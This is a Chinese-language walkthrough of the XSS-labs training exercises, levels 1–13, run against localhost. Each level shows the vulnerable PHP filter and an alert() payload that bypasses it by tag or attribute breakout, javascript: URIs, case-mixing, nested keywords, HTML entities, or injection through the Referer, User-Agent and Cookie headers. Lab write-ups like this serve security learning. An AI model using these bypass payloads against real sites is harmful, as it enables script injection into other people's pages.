# XSS-labs

参考博客文章如下，十分感谢：

* https://skywt.cn/blog/xss-labs-tutorial/
* https://blog.csdn.net/2301_80031208/article/details/139159525



## 第一关：未对 POST 参数进行任何过滤

后端源码：

```php
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

解题思路：

```html
http://localhost/xss-labs/level1.php?name=<script>alert()</script>
```



## 第二关：标签闭合 + JS注入

这关如果在输入框中直接注入 `<script>alert()</script>`，会发现（**Deverloper Tool —> Network —> Get Request Item —> Response** 或者**右击查看网页源代码**）：Get 请求所发送的数据被后端转义成 HTML 实体了！但是，通过观察后端源码可知，`htmlspecialchars()` 函数并没有对单引号进行转义，好吧这点尽管在这里利用不上，最后得出一个结论：无法在 <h2> 标签处中进行 XSS 注入

```html
<h2 align=center>没有找到和&lt;script&gt;alert()&lt;/script&gt;相关的结果.</h2><center>
```

用于将前端数据转义成 HTML 实体的后端代码：

```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
```

在认真观察下前端页面 html 源码：

前端页面 html 源码：输入框输入的数据赋值给了 value 属性

```html
<input name="keyword" value="ddd">
```

解题思路：闭合 input 标签 + 注入JS

```js
// 符号 "> 用于闭合 input 标签，即构成 <input name=keyword  value="">
"><script>alert()</script>
```



## 第三关：标签属性闭合 + 注入事件属性

这关和上一关蛮像的，在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现不但 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value属性 的内容也被 HTML 实体化了！

```html
<h2 align=center>没有找到和&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;相关的结果.</h2><center>
```

```html
<input name=keyword  value='&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;'>	
```

后端用于将数据转换为 HTML 实体的函数源码如下：

```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
```

```php
<input name=keyword  value='".htmlspecialchars($str)."'>	
```

发现，其并不会将单引号 `'` 转换为 HTML 实体，故使用 **value 标签属性闭合 + 注入事件属性**：

> 注：在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 `<`、`>`、`&`、`'`、`"` 这五个字符，基本可以防范这里的 XSS 攻击。
> 但是，8.1.0 以下版本的 PHP 默认只会转义 `<`、`>`、`&`、`"` 这四个字符，不会转义单引号 `'`。这就给这个函数带来了巨大的安全隐患。

```js
// 第 1 个单引号用于与 value 属性的第一个单引号构成闭合, 即构成 value=''
// 第 2 个单引号用于与 value 属性的第二个单引号构成闭合, 即构成 onclick='alert()'
' onclick='alert()
```

注入结果：

```html
<input name="keyword" value="" onclick="alert()">
```

**扩展：请思考为什么注入时使用的单引号`'`，而在前端页面被显示成了双引号`"`？？？**



## 第四关：标签属性闭合 + 注入事件属性

在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的内容被过滤掉了`<`及`>`！

```html
<h2 align=center>没有找到和&lt;script&gt;alert()&lt;/script&gt;相关的结果.</h2><center>
```

```html
<input name=keyword  value="scriptalert()/script">
```

后端用于数据过滤的源码如下：

```php
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<input name=keyword  value="'.$str3.'">
```

解题思路同第三关，使用：**value 标签属性闭合 + 注入事件属性**

```js
// 第 1 个双引号用于与 value 属性的第一个双引号构成闭合, 即构成 value=""
// 第 2 个双引号用于与 value 属性的第二个双引号构成闭合, 即构成 onclick="alert()"
" onclick="alert()
```

注入结果：

```html
<input name="keyword" value="" onclick="alert()">
```



## ⭐️第五关：href属性 + JS伪协议 

在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，盲猜后端试图通过替换 JS 关键字，来防止 XSS 攻击！

```html
<h2 align=center>没有找到和&lt;script&gt;alert()&lt;/script&gt;相关的结果.</h2><center>
```

```html
<input name=keyword  value="<scr_ipt>alert()</script>">
```

来看下后端代码吧：emmm，看起来有点好笑emmm...

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<input name=keyword  value="'.$str3.'">
```

分析下吧：

```php
// 导致无法使用`直接注入法`
$str2=str_replace("<script","<scr_ipt",$str);
// 导致无法使用`注入事件属性法`
$str3=str_replace("on","o_n",$str2);
```

会发现之前使用的**所有方法均无法使用**！这里引入一个新的 XSS 攻击技巧，即利用**href属性 + JS伪协议 **：

> 不同于许多人的印象，`<a>` 标签的 href 值并非只能是 URL，而是 URI。**URI（Uniform Resource Identifier）**可以视为 URL 的超集，其不仅包含以 `protocol://address` 开头的 URL，也包含 `protocol:content` 这种形式的地址（参见 RFC 3986）。我们经常用到的有：`javascript:` 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；`mailto:` 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。

```js
// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
"> <a href=javascript:alert()>hack it</a>
```

注入结果：

```html
<input name="keyword" value=""> <a href="javascript:alert()">hack it</a>"&gt;
```



## 第六关：关键字大小写混合绕过

在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，emmmm怎么和第五关一样？？！！

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hack')&lt;/script&gt;相关的结果.</h2><center>
```

```html
<input name=keyword  value="<scr_ipt>alert('hack')</script>">
```

那么尝试使用第五关的 payload：

```js
// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
"> <a href=javascript:alert()>hack it</a>
```

发现，**href**关键字也被替换过了！

```html
<input name=keyword  value=""> <a hr_ef=javascript:alert()>hack it</a>">
```

看下后端用于替换关键字的源码吧，`on`、`src`、`data`、`href` 关键字都会被替换掉！但是但是但是，发现在替换关键字之前并不会先将其转换为统一的小写或大写字母，那么解题思路就很清晰咯~

```html
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>

<input name=keyword  value="'.$str6.'">
```

解题思路1：标签闭合 + JS注入，这里的 payload 同第二关，只不过把 script 改成了大写而已：

```js
// 符号 "> 用于闭合 input 标签，即构成 <input name=keyword  value="">
"><SCRIPT>alert()</SCRIPT>
```

解题思路2：标签属性闭合 + 注入事件属性，这里的 payload 同第四关，只不过把 onclick 改成了大写而已：

```js
// 第 1 个双引号用于与 value 属性的第一个双引号构成闭合, 即构成 value=""
// 第 2 个双引号用于与 value 属性的第二个双引号构成闭合, 即构成 onclick="alert()"
" ONCLICK="alert()
```

解题思路3：利用 href 属性 + JS 伪协议，这里的 payload 同第五关，只不过把 href 改成大写而已：

```js
// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
"> <a HREF=javascript:alert()>hack it</a>
```



## 第七关：仅替换一次关键字

在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，即关键字 script 被空字符替换掉了！

```html
<h2 align=center>没有找到和&lt;script&gt;alert()&lt;/script&gt;相关的结果.</h2><center>
```

```html
<input name=keyword  value="<>alert()</>">
```

根据之前的经验，盲猜后端程序员脑子emmmm....好吧盲猜后端用于关键字替换的代码存在逻辑问题，**即只替换一次关键字**，例如我们拟造一个 XSS payload 试试看：

```js
// 利用标签属性闭合 + JS注入: 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
// script被替换后，SCR 及 IPT 将构成新的 SCRIPT
"> <SCRscriptIPT>alert()</SCRscriptIPT>
```

啊哈！我们做到了！后端程序员脑子的确emmmm....，好吧，现在来一起看下后端用于关键字替换的代码吧：

代码审计：相比于上一关，尽管对前端拿到的数据进行了统一小写处理，避免了大小写绕过的可能，但是用于关键字替换的代码存在逻辑问题，**即只替换一次关键字**！

```html
$str =strtolower( $_GET["keyword"]);

$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);

echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<input name=keyword  value="'.$str6.'">
```



## ⭐️第八关：href 中可使用 HTML 实体

在输入框直接注入 `<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <input> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是依旧无法利用此漏洞来闭合绕过，因为属性 value 的闭合符号为双引号`"`）<a> 标签里 href 属性的内容有被替换过的痕迹！

```html
<input name=keyword  value="&lt;script&gt;alert('hi')&lt;/script&gt;">
<input type=submit name=submit value=添加友情链接 />
```

```html
<center><BR><a href="<scr_ipt>alert('hi')</scr_ipt>">友情链接</a></center>
```

**解题思路 1**：尝试闭合 input 标签中的 value 属性，并添加事件属性

```js
' onclick='alert()
```

注入结果如下，并没有成功！

```html
<input name=keyword  value="' onclick='alert()">
```

**解题思路 2**：尝试在 href 属性中注入 JavaScript 伪协议，为了防止关键字被替换，这里再对关键字字母大小写混合一下：

```js
jAvASCriPt:alert()
```

注入结果如下，并没有成功！

```html
<center><BR><a href="javascr_ipt:alert()">友情链接</a></center>
```

**解题思路 3**：尝试闭合 a 标签中的 href 属性，并添加事件属性，为了防止关键字被替换，这里再对关键字字母大小写混合一下：

```html
" oNcLiCk="alert()
```

注入结果如下，依旧没有成功！

```html
<center><BR><a href="&quot o_nclick=&quotalert()">友情链接</a></center>
```

综上可得：

* input 标签中 value 属性的内容被 HTML实体化了，单引号 / 双引号闭合绕过也失效了！
* a 标签中 href 属性的内容被 HTML 实体化了，而且还对 JS 关键字进行了替换（其还会先将数据转换为统一大小写）！

所以说怎么办呢？先来看下后端源代码压压惊吧：

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
```

好吧，有上述后端源代码可得，我们之前的***所有注入方法均失效了！**这里我们引入一个新的知识点，也是 href 属性的一个特性，即 **href 传入的 URI 中，也可以使用 HTML 字符实体，在打开链接时，字符实体也会被转换为对应的字符！**

值得注意的是：HTML 实体有两种写法，第一种是之前提到的 `&entity_name;` 形式，比如 `$lt;` 表示小于号；第二种是 `&#entity_number;` 形式，其中 entity_number 是字符的实体编号，比如 `<` 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。可以使用[这个工具](https://mothereff.in/html-entities)来转换。

对于这题，为了绕过 `javascript` 这个词的屏蔽，我们将 i 写为其字符实体 `i` 即可：

```html
javascr&#x69;pt:alert()
```



## 第九关：href 中可使用 HTML 实体

在输入框直接注入 `<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <input> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是依旧无法利用此漏洞来闭合绕过，因为属性 value 的闭合符号为双引号`"`），<a> 标签里 href 属性的内容是后端代码的返回值！

```html
<input name=keyword  value="&lt;script&gt;alert('hi')&lt;/script&gt;">
<input type=submit name=submit value=添加友情链接 />
```

```html
<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>
```

如何输入一个应该合法的链接呢？

```html
<input name=keyword  value="http://goog.tech">
<input type=submit name=submit value=添加友情链接 />
```

```html
<center><BR><a href="http://goog.tech">友情链接</a></center><center>
```

那么问题来了，后端代码是怎么判断一个链接是否"合法"呢？最简单的方法应该是判断是否包含关键字`http://`，Ok，我们来试一下：

```js
http://" onclick="alert()
```

运行结果如下，的确证实了我们的想法，但是问题又来了，<a> 标签 href 属性中的内容被 HTML 实体化了，且进行了关键字替换！

```html
<center><BR><a href="http://&quot o_nclick=&quotalert()">友情链接</a></center>
```

看起来有些无解的感觉... 但是我们使用上一关的 payload（绕过 HTML 实体化以及关键字替换），并在其后加上 `http://`（绕过关键字检查）！

````js
// 通过 JS 注释符号 // 来 `http://` 注释掉，防止其影响到前面 JS 的执行
javascr&#x69;pt:alert()//http://
````

注入结果如下，注入成功！！！

```html
<center><BR><a href="javascr&#x69;pt:alert()//http://">友情链接</a></center>
```



## 第十关：标签属性闭合 + 注入事件属性

发送 Get 请求：`http://localhost/xss-labs/level10.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 3 个奇奇怪怪的被隐藏的 <input> 标签！

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hi')&lt;/script&gt;相关的结果.</h2><center>

<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

那么我们尝试在 Get 请求中加入这三个关键字：`http://localhost/xss-labs/level10.php?keyword=<script>alert('hi')</script>&t_link=<script>alert('hi')</script>&t_history=<script>alert('hi')</script>&t_sort=<script>alert('hi')</script>`

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hi')&lt;/script&gt;相关的结果.</h2><center>

<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="scriptalert('hi')/script" type="hidden">
```

发现第三个 <input> 标签中 value 属性的值有回显！而且有被替换的痕迹！即`<`与`>`被空字符替换掉了！

Ok，如果后端不会替换双引号 `"`，那么解题思路很清晰啦，即闭合 value 属性后注入带有事件的属性：

```js
// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
http://localhost/xss-labs/level10.php?t_sort=" onclick="alert()" type="
```

注入结果如下，注入成功！

```html
<input name="t_sort"  value="" onclick="alert()" type="" type="hidden">
```



## 第十一关：标签属性闭合 + 注入事件属性

发送 Get 请求：`http://localhost/xss-labs/level11.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上一关一样，**第 4 个惊奇地发现其 value 值竟然是上一关的 payload！！！**

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hi')&lt;/script&gt;相关的结果.</h2><center>

<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">

<input name="t_ref"  value="http://localhost/xss-labs/level10.php?t_sort=%22%20onclick=%22alert()%22%20type=%22" type="hidden">
```

我们先来验证前 3 个 <input> 标签是否存在可注入的疑点，发送 Get 请求：`http://localhost/xss-labs/level11.php?t_link=<script>alert('hi')</script>&t_history=<script>alert('hi')</script>&t_sort=<script>alert('hi')</script>`，然后发现第 3 个 <input> 标签中的 value 值被 HTML 实体化了，尽管发现其中单引号（`'`）没有被 HTML 实体化，**但是单引号在这里没办法闭合前面的双引号**，所以总的来说这 3 个 <input> 标签没有 XSS 注入点！

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="&lt;script&gt;alert('hi')&lt;/script&gt;" type="hidden">
```

所以我们重新回到开头，分析下述 html 代码，是否可以通过 BurpSuite 拦截 `http://localhost/xss-labs/level10.php?t_sort=%22%20onclick=%22alert()%22%20type=%22`，然后将其修改成 `" onclick="alert()" type="` （**盲猜下述 value 属性内容不会被转换成 HTML 实体，也不存在关键字替换等骚操作**）呢？我想说可以试试的！！！

```html
<input name="t_ref"  value="http://localhost/xss-labs/level10.php?t_sort=%22%20onclick=%22alert()%22%20type=%22" type="hidden">
```

Let's do it！！！在 BurpSuite 中拦截第 10 关的通关 payload（即下述 Referer 的值），然后将其修改成：`" onclick="alert()" type="` .

```js
// 修改前的结果：
Referer: http://localhost/xss-labs/level10.php?t_sort=%22%20onclick=%22alert()%22%20type=%22
// 修改后的结果：
// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
Referer: " onclick="alert()" type="
```

然后右击查看源代码，发现成功注入！！！🎉

```html
<input name="t_ref"  value="" onclick="alert()" type="" type="hidden">
```



## 第十二关：标签属性闭合 + 注入事件属性

发送 Get 请求：`http://localhost/xss-labs/level12.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上关及上上关一样，**第 4 个惊奇地发现其 value 值是 User-Agent ！！！**

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hi')&lt;/script&gt;相关的结果.</h2><center>

<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
  
<input name="t_ua"  value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" type="hidden">
```

有了上一关的经验，我们长话短说，直接开干！尝试将 `User-Agent` 修改成 `" onclick="alert()" type="`（**盲猜其 value 属性内容不会被转换成 HTML 实体，也不存在关键字替换等骚操作**），然回随便发一个 Get 请求！

```js
// 修改前的结果：
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
// 修改后的结果：
// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
User-Agent: " onclick="alert()" type="
```

然后右击查看源代码，发现成功注入！！！🎉

```html
<input name="t_ua"  value="" onclick="alert()" type="" type="hidden">
```



## 第十三关：标签属性闭合 + 注入事件属性

发送 Get 请求：`http://localhost/xss-labs/level13.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上面那三关一样，**第 4 个根据 t_cook 提示，其 value 值应该是指 Cookie 值 ！**

```html
<h2 align=center>没有找到和&lt;script&gt;alert('hi')&lt;/script&gt;相关的结果.</h2><center>

<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
  
<input name="t_cook"  value="call me maybe?" type="hidden">
```

有了前面三关的经验，这里长话短说，点击浏览器中的 Developer Tool —> Applicatoin —> Cookie，然后将 Cookie value 修改成：`" onclick="alert()" type="`（**盲猜其 value 属性内容不会被转换成 HTML 实体，也不存在关键字替换等骚操作**）：

```js
// 修改前：
Cookie value: call+me+maybe%3F
// 修改后：
// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
Cookie value: " onclick="alert()" type="
```

然后右击查看源代码，发现成功注入！！！🎉

```html
<input name="t_cook"  value="" onclick="alert()" type="" type="hidden">
```



## 第十四关：❌

这关所引用的网站挂了，暂时不做并跳过...



## 第十五关：



## 第十六关：



2024 / 1 / 9 / 23: 12